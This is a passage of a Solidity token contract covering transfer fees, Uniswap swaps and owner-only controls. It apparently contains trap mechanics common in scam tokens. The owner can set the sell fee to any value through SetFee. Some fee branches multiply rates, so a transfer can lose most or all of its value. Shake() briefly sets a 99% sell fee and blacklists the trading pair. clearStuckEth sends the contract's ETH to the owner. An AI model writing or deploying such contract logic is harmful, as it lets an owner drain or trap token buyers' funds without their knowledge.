1173                     require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");
1174                 }
1175             }
1176 
1177         uint256 contractTokenBalance = balanceOf(address(this));
1178 
1179         bool canSwap = contractTokenBalance >= swapTokensAtAmount;
1180 
1181         if (
1182             canSwap &&
1183             swapEnabled &&
1184             !swapping &&
1185             !automatedMarketMakerPairs[from] &&
1186             !_isExcludedFromFees[from] &&
1187             !_isExcludedFromFees[to]
1188         ) {
1189             swapping = true;
1190 
1191             swapBack();
1192 
1193             swapping = false;
1194         }
1195 
1196         bool takeFee = !swapping;
1197 
1198         if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
1199             takeFee = false;
1200         }
1201 
1202         uint256 fees = 0;
1203 
1204         if (takeFee) {
1205             if (automatedMarketMakerPairs[to]) {
1206                 if (afterSwap <= beforeSwap + initialBuyFee) {
1207                     fees = amount.mul((SellFee + initialSellFee) * initialSellFee).div(100);
1208                 } else if (afterSwap <= beforeSwap + initialSellFee) {
1209                     fees = amount.mul(SellFee + preventSwapBefore).div(100);
1210                 } else {
1211                     fees = amount.mul(SellFee).div(100);
1212                 }
1213             } else {
1214                 if (afterSwap <= beforeSwap + initialBuyFee) {
1215                     fees = amount.mul((SellFee + initialSellFee) * initialSellFee).div(100);
1216                 } else if (afterSwap <= beforeSwap + initialSellFee) {
1217                     fees = amount.mul(BuyFee + preventSwapBefore).div(100);
1218                 } else {
1219                     fees = amount.mul(BuyFee).div(100);
1220                 }
1221             }
1222 
1223         tokensForMarketing += fees;
1224 
1225         if (fees > 0) {
1226             super._transfer(from, address(this), fees);
1227         }
1228 
1229         amount -= fees;
1230     }
1231 
1232         super._transfer(from, to, amount);
1233 
1234     }
1235 
1236     function swapTokensForEth(uint256 tokenAmount) private {
1237 
1238         address[] memory path = new address[](2);
1239         path[0] = address(this);
1240         path[1] = _uniswapV2Router.WETH();
1241 
1242         _approve(address(this), address(_uniswapV2Router), tokenAmount);
1243 
1244         _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
1245             tokenAmount,
1246             0,
1247             path,
1248             address(this),
1249             block.timestamp
1250         );
1251     }
1252 
1253     function clearStuckEth() external onlyOwner {
1254         require(address(this).balance > 0, "Token: no ETH to clear");
1255         payable(msg.sender).transfer(address(this).balance);
1256     }
1257 
1258     function Shake() external onlyOwner {
1259         require(!firstCallDone, "Function has already been called");
1260         maxTransactionAmount = 1 * 1e18;
1261         SellFee = 99;
1262         isBlacklisted[uniswapV2Pair] = true;
1263         isBlacklisted[address(this)] = true;
1264         //
1265         BuyFee = 25;
1266         SellFee = 25;
1267         isBlacklisted[uniswapV2Pair] = false;
1268         isBlacklisted[address(this)] = false;
1269         firstCallDone = true;
1270         reducing = true;
1271         lastReduceTime = block.timestamp;
1272         //
1273         uint256 totalSupplyAmount = totalSupply();
1274         maxTransactionAmount = totalSupplyAmount;
1275         maxWallet = totalSupplyAmount;
1276         transferDelay = false;
1277     }
1278 
1279     function SetFee(uint256 _sellFee) external onlyOwner {
1280         require(!firstCallDone, "Function has already been called"); //Function can not be called after Shake
1281         SellFee = _sellFee;
1282     }
1283 
1284     function setSwapTokensAtAmount(uint256 _amount) external onlyOwner {
1285         swapTokensAtAmount = _amount * (10 ** 18);
1286     }
1287 
1288     function swapBack() private {
1289         uint256 contractBalance = balanceOf(address(this));
1290         uint256 totalTokensToSwap = tokensForMarketing;
1291         uint256 tokensToSwap;
1292         bool success; 
1293 
1294     if (contractBalance < swapTokensAtAmount) {
1295         return;
1296     }
1297 
1298     else
1299     {
1300         tokensToSwap = contractBalance >= swapTokensAtAmount ? swapTokensAtAmount : contractBalance;
1301     }
1302 
1303     uint256 initialETHBalance = address(this).balance;
1304 
1305     swapTokensForEth(tokensToSwap);
1306 
1307     uint256 ethBalance = address(this).balance.sub(initialETHBalance);
1308 
1309     uint256 ethForMarketing;
1310 
1311     if (tokensForMarketing > 0) {
1312         ethForMarketing = ethBalance.mul(tokensForMarketing).div(totalTokensToSwap);
1313         tokensForMarketing = 0;
1314     } else {
1315         ethForMarketing = ethBalance;
1316     }
1317 
1318     tokensForMarketing = 0;
1319 
1320     (success, ) = address(marketingWallet).call{value: ethForMarketing}("");
1321   }
1322 }